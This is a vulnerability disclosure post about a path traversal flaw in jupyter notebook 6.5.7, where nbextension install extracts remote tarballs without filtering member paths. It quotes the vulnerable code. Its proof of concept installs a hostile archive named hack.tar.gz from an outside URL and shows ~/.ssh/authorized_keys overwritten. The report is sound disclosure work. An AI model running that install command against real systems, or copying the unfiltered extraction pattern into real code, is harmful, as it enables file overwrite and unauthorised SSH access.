---
layout: post
title:  "Arbitrary File Overwrite in jupyter notebook"
date:  2024-07-09 10:31:06 +0800
categories: file-overwrite
---

## Name

> Arbitrary File Overwrite in jupyter notebook

## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Version

> 6.5.7


### Summary

Notebook can install a Javascript extension [from remote sources](https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L69), if the remote source package is compressed using tar format, it will use [`tarfile.extractall`](https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L154) to extract tarball.  However, it doesn't filter the members in tarball, in this case, members with absolute and relative path names will be extract outside target directory, causing arbitrary file overwrite.

### Details

From the [source code](https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L635), user can install nbextension by following command:

```
jupyter nbextension install path|url [--user|--sys-prefix]
```
When installing packages from an url, it calls `install_nbextension` to download the tarball from online source and extracts the tarball using `tarfile.extractall`.
The vulnerable function [`install_nbextension#L154`](https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L154).

```
def install_nbextension(path, overwrite=False, symlink=False,
                        user=False, prefix=None, nbextensions_dir=None,
                        destination=None, verbose=DEPRECATED_ARGUMENT,
                        logger=None, sys_prefix=False
                        ):
    ...
    if path.startswith(('https://', 'http://')):
        if symlink:
            raise ValueError("Cannot symlink from URLs")
        # Given a URL, download it
        with TemporaryDirectory() as td:
            filename = urlparse(path).path.split('/')[-1]
            local_path = os.path.join(td, filename)
            if logger:
                logger.info(f"Downloading: {path} -> {local_path}")
            urlretrieve(path, local_path)
            # now install from the local copy
            full_dest = install_nbextension(local_path, overwrite=overwrite, symlink=symlink,
                nbextensions_dir=nbext, destination=destination, logger=logger)
    elif path.endswith('.zip') or _safe_is_tarfile(path):
        if symlink:
            raise ValueError("Cannot symlink from archives")
        if destination:
            raise ValueError("Cannot give destination for archives")
        if logger:
            logger.info(f"Extracting: {path} -> {nbext}")

        if path.endswith('.zip'):
            archive = zipfile.ZipFile(path)
        elif _safe_is_tarfile(path):
            archive = tarfile.open(path)
        # Vulnerable sink!!!!
        archive.extractall(nbext)
        archive.close()
        ...

    return full_dest
```


### PoC

1. Using following command to install a malicious extension:

    ```
     jupyter nbextension install https://media.githubusercontent.com/media/sunriseXu/onnx/main/hack.tar.gz --user
    ```
2. Check file path `/home/kali/.ssh/authorized_keys` has been overwritten
    ```
     ls -la /home/kali/.ssh
     > -rw-r--r--  1 kali kali 2098 Sep 11  2023 authorized_keys
    ```
3. Check on [colab](https://colab.research.google.com/drive/1iX1yj4CaRn4fQBoiejQM059Xp9z8gOmm?usp=sharing).

<img width="751" alt="1720496729240" src="https://github.com/jupyter/notebook/assets/33363160/90fc632b-dd9c-43c2-9a41-61ded73ac4a8">

 
### Impact

If a victim installs a malicious tarball extension, the tarball will be extracted outside the target directory and cause arbitrary file overwrite.
